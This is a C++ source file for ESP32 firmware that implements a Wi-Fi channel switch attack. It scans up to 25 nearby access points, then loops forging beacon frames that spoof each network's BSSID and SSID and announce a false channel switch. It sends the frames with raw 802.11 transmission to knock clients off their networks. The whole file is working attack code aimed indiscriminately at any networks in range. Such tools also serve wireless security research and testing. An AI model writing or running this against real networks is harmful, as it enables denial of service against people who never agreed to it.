#include "channel_switch_attack.h"
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>

extern "C" {

#if !defined(MAX_WIFI_CHANNEL)
#define MAX_WIFI_CHANNEL 13
#endif

#define MAX_ATTACK_APS 25

static uint32_t csa_packets_sent = 0;
static TaskHandle_t csa_task_handle = NULL;
static volatile bool csa_stop_requested = false;

static wifi_ap_record_t attack_aps[MAX_ATTACK_APS];
static int attack_ap_count = 0;

static void attack_scan_aps(void) {
  attack_ap_count = 0;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  int n = WiFi.scanNetworks(false, true);
  if (n <= 0) {
    WiFi.scanDelete();
    return;
  }
  attack_ap_count = (n > MAX_ATTACK_APS) ? MAX_ATTACK_APS : n;
  for (int i = 0; i < attack_ap_count; i++) {
    memcpy(attack_aps[i].bssid, WiFi.BSSID(i), 6);
    attack_aps[i].primary = WiFi.channel(i);
    String raw = WiFi.SSID(i);
    strncpy((char *)attack_aps[i].ssid, raw.c_str(), 32);
    attack_aps[i].ssid[32] = '\0';
  }
  WiFi.scanDelete();
}

static void wifi_tx_prepare_ap_mode(void) {
  // Use low-level esp_wifi APIs only; avoid Arduino WiFi.mode()/WiFi.disconnect()
  esp_wifi_disconnect();
  vTaskDelay(pdMS_TO_TICKS(50));
  esp_wifi_stop();
  vTaskDelay(pdMS_TO_TICKS(100));

  wifi_config_t ap_config = {};
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  vTaskDelay(pdMS_TO_TICKS(200));
}

static void wifi_tx_restore_sta_mode(void) {
  // Restore STA mode using esp_wifi APIs (avoid Arduino wrappers)
  esp_wifi_stop();
  vTaskDelay(pdMS_TO_TICKS(100));
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  vTaskDelay(pdMS_TO_TICKS(100));
}

static uint8_t get_different_channel(int ap_channel) {
  uint8_t new_channel;
  do {
    new_channel = 1 + (esp_random() % MAX_WIFI_CHANNEL);
  } while (new_channel == (uint8_t)ap_channel);
  return new_channel;
}

static void build_csa_beacon(uint8_t *beacon, size_t *beacon_len,
                             uint8_t *bssid, uint8_t *ssid, uint8_t ssid_len,
                             uint8_t ap_channel, uint8_t new_channel, uint16_t seq_num) {
  uint8_t *ptr = beacon;

  *ptr++ = 0x80; *ptr++ = 0x00;
  *ptr++ = 0x00; *ptr++ = 0x00;
  memcpy(ptr, bssid, 6); ptr += 6;
  memcpy(ptr, bssid, 6); ptr += 6;
  memcpy(ptr, bssid, 6); ptr += 6;
  *ptr++ = seq_num & 0xFF;
  *ptr++ = (seq_num >> 8) & 0xFF;

  uint64_t ts = esp_timer_get_time();
  memcpy(ptr, &ts, 8); ptr += 8;
  *ptr++ = 0x64; *ptr++ = 0x00;
  *ptr++ = 0x01; *ptr++ = 0x00;

  *ptr++ = 0x00;
  *ptr++ = ssid_len;
  memcpy(ptr, ssid, ssid_len); ptr += ssid_len;

  uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(ptr, rates, sizeof(rates)); ptr += sizeof(rates);

  *ptr++ = 0x03;
  *ptr++ = 0x01;
  *ptr++ = ap_channel;

  *ptr++ = 0x25;
  *ptr++ = 0x03;
  *ptr++ = 0x01;
  *ptr++ = new_channel;
  *ptr++ = 0x03;

  *beacon_len = ptr - beacon;
}

static void csa_attack_task(void *param) {
  (void)param;

  char sanitized_ssid[33];
  uint32_t last_log = 0;
  uint16_t seq_num = 0;
  uint8_t beacon_buf[300];
  size_t beacon_len;

  Serial.printf("CSA Attack: Targeting %d AP(s)\n", attack_ap_count);

  for (int i = 0; i < attack_ap_count; i++) {
    char *ssid = (char *)attack_aps[i].ssid;
    if (strlen(ssid) == 0) {
      snprintf(sanitized_ssid, sizeof(sanitized_ssid), "[Hidden]");
    } else {
      snprintf(sanitized_ssid, sizeof(sanitized_ssid), "%s", ssid);
    }
    Serial.printf("  [%d] %s (Ch:%d) %02X:%02X:%02X:%02X:%02X:%02X\n",
                  i, sanitized_ssid, attack_aps[i].primary,
                  attack_aps[i].bssid[0], attack_aps[i].bssid[1],
                  attack_aps[i].bssid[2], attack_aps[i].bssid[3],
                  attack_aps[i].bssid[4], attack_aps[i].bssid[5]);
  }

  while (!csa_stop_requested) {
    for (int i = 0; i < attack_ap_count && !csa_stop_requested; i++) {
      int ap_channel = attack_aps[i].primary;
      if (ap_channel < 1 || ap_channel > MAX_WIFI_CHANNEL) {
        ap_channel = 1;
      }

      uint8_t new_channel = get_different_channel(ap_channel);
      esp_wifi_set_channel(new_channel, WIFI_SECOND_CHAN_NONE);
      vTaskDelay(pdMS_TO_TICKS(1));

      uint8_t ssid_len = strnlen((char *)attack_aps[i].ssid, 32);

      for (int burst = 0; burst < 5 && !csa_stop_requested; burst++) {
        build_csa_beacon(beacon_buf, &beacon_len,
                         attack_aps[i].bssid,
                         attack_aps[i].ssid, ssid_len,
                         (uint8_t)ap_channel, new_channel, seq_num++);

        esp_wifi_80211_tx(WIFI_IF_AP, beacon_buf, beacon_len, false);
        csa_packets_sent++;
        vTaskDelay(pdMS_TO_TICKS(2));
      }
    }

    vTaskDelay(pdMS_TO_TICKS(100));

    uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
    if (now - last_log >= 5000) {
      Serial.printf("CSA: %" PRIu32 " pkts/sec\n", csa_packets_sent / 5);
      csa_packets_sent = 0;
      last_log = now;
    }
  }

  csa_task_handle = NULL;
  vTaskDelete(NULL);
}

void channel_switch_attack_start(void) {
  if (csa_task_handle != NULL) {
    Serial.println("CSA Attack already running.");
    return;
  }

  attack_scan_aps();
  if (attack_ap_count == 0) {
    Serial.println("No APs found — run a WiFi scan first");
    return;
  }
  Serial.println("[CSA] start called");
  Serial.println("[CSA] calling wifi_tx_prepare_ap_mode");
  wifi_tx_prepare_ap_mode();
  Serial.println("[CSA] wifi_tx_prepare_ap_mode done");
  Serial.printf("[CSA] Starting Channel Switch Attack on %d AP(s)...\n", attack_ap_count);

  csa_stop_requested = false;
  csa_packets_sent = 0;

  Serial.println("[CSA] creating task");
  BaseType_t rc = xTaskCreate(csa_attack_task, "csa_attack", 3072, NULL, 5, &csa_task_handle);
  if (rc != pdPASS) {
    Serial.printf("Failed to start CSA attack task (%ld)\n", (long)rc);
    csa_task_handle = NULL;
    csa_stop_requested = false;
    wifi_tx_restore_sta_mode();
  }
  Serial.println("[CSA] task created");
}

void channel_switch_attack_stop(void) {
  if (csa_task_handle != NULL) {
    Serial.println("Stopping CSA attack...");
    csa_stop_requested = true;

    int wait_count = 0;
    while (csa_task_handle != NULL && wait_count < 100) {
      vTaskDelay(pdMS_TO_TICKS(10));
      wait_count++;
    }

    if (csa_task_handle != NULL) {
      vTaskDelete(csa_task_handle);
      csa_task_handle = NULL;
    }

    csa_stop_requested = false;
    wifi_tx_restore_sta_mode();
  }
}

bool channel_switch_attack_is_running(void) {
  return csa_task_handle != NULL;
}

uint32_t channel_switch_attack_get_packets_sent(void) {
  return csa_packets_sent;
}

void channel_switch_attack_reset_packet_counter(void) {
  csa_packets_sent = 0;
}

} // extern "C"
